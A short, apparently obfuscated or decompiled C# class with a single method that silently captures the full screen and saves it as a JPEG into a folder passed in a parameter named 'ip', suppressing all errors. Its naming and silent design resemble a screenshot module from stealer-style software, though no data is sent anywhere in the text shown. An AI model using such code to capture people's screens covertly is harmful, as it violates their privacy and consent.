using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

internal class aj
{
	public static void a(string ip)
	{
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap bitmap = new Bitmap(width, height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(ip + "\\Screen" + ".Jpeg", ImageFormat.Jpeg);
		}
		catch
		{
		}
	}
}
